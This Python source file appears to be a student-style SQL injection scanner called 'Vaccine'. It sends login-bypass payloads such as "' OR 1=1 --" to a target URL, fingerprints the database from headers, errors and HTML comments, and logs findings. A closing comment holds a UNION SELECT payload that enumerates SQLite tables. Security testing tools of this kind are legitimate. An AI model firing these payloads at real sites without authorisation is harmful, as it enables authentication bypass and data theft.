import requests
import argparse
from bs4 import BeautifulSoup, Comment

class Vaccine:
    def __init__(self, url, method='GET', archive=None):
        self.url = url
        self.method = method
        self.archive = archive or 'vulnerabilities.log'
        self.payloads = ["' OR 1=1 --", "'"]
        self.payloads_pass = ["qwerty"]
        self.results = []
        self.database = None

    def test_injection(self):
        before = requests.get(self.url)
        for payload in self.payloads:
            for password in self.payloads_pass:
                if self.method.upper() == 'GET':
                    response = requests.get(self.url, params={'login': payload, 'password': password})
                    if self.database == None:
                        self.database = self.identify_sgbd(response)
                elif self.method.upper() == 'POST':
                    response = requests.post(self.url, data={'login': payload, 'password': password})
                    if self.database == None:
                        self.database = self.identify_sgbd(response)
                if self.is_vulnerable(before, response) == True:
                    self.results.append((self.url, payload))
                    self.log_result(self.url, payload)
                print(self.database)

    def is_vulnerable(self, before, response):
        error_messages = ["you have an error in your SQL syntax;", "unclosed quotation mark after the character string", "syntax error", "warning", "welcome", "failed"]
        if before.text != response.text:
            for error_message in error_messages:
                if error_message in response.text.lower():
                    return True
        return False

    def log_result(self, url, payload):
        with open(self.archive, 'a') as file:
            file.write(f'URL: {url}\nPayload: {payload}\n\n')

    def run(self):
        # print("SGDB: ", self.identify_sgbd())
        self.test_injection()
        if self.results:
            print("Vulnerabilities found:")
            # for result in self.results:
                # print(f"URL: {result[0]} Payload: {result[1]}")
            print(f"Database: {self.database}")
        else:
            print("No vulnerabilities found.")

    def identify_sgbd(self, after):
        response = requests.get(self.url)
        server_header = response.headers.get('Server', '').lower()
        powered_by_header = response.headers.get('X-Powered-By', '').lower()

        # Analyze HTTP headers
        if 'mysql' in server_header or 'mysql' in powered_by_header:
            return "MySQL"
        elif 'mariadb' in server_header or 'mariadb' in powered_by_header:
            return "MariaDB"
        elif 'postgresql' in server_header or 'postgresql' in powered_by_header:
            return "PostgreSQL"
        elif 'oracle' in server_header or 'oracle' in powered_by_header:
            return "Oracle"
        elif 'sqlite' in server_header or 'sqlite' in powered_by_header:
            return "SQLite"
        elif 'microsoft sql server' in server_header or 'microsoft sql server' in powered_by_header:
            return "Microsoft SQL Server"
        elif 'mongodb' in server_header or 'mongodb' in powered_by_header:
            return "MongoDB"

        # Analyze error messages
        error_response = after
        error_message = error_response.text.lower()
        # print(error_message)
        if 'mysql' in error_message:
            return "MySQL"
        elif 'mariadb' in error_message:
            return "MariaDB"
        elif 'postgresql' in error_message or 'syntax error at or near' in error_message:
            return "PostgreSQL"
        elif 'oracle' in error_message:
            return "Oracle"
        elif 'sqlite' in error_message or 'no such table' in error_message:
            return "SQLite"
        elif 'microsoft sql server' in error_message:
            return "Microsoft SQL Server"
        elif 'mongodb' in error_message:
            return "MongoDB"

        # Analyze page source for database clues
        soup = BeautifulSoup(response.text, 'html.parser')
        comments = soup.findAll(string=lambda text: isinstance(text, Comment))
        for comment in comments:
            comment_lower = comment.lower()
            if 'mysql' in comment_lower:
                return "MySQL"
            elif 'mariadb' in comment_lower:
                return "MariaDB"
            elif 'postgresql' in comment_lower:
                return "PostgreSQL"
            elif 'oracle' in comment_lower:
                return "Oracle"
            elif 'sqlite' in comment_lower:
                return "SQLite"
            elif 'microsoft sql server' in comment_lower:
                return "Microsoft SQL Server"
            elif 'mongodb' in comment_lower:
                return "MongoDB"

        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Detection Tool")
    parser.add_argument("url", help="URL to test for SQL injection")
    parser.add_argument("-X", "--method", choices=["GET", "POST"], default="GET", help="HTTP method to use")
    parser.add_argument("-o", "--archive", help="File to store the results")
    
    args = parser.parse_args()
    
    vaccine = Vaccine(url=args.url, method=args.method, archive=args.archive)
    vaccine.run()

# ' UNION SELECT name, NULL FROM sqlite_master WHERE type='table' --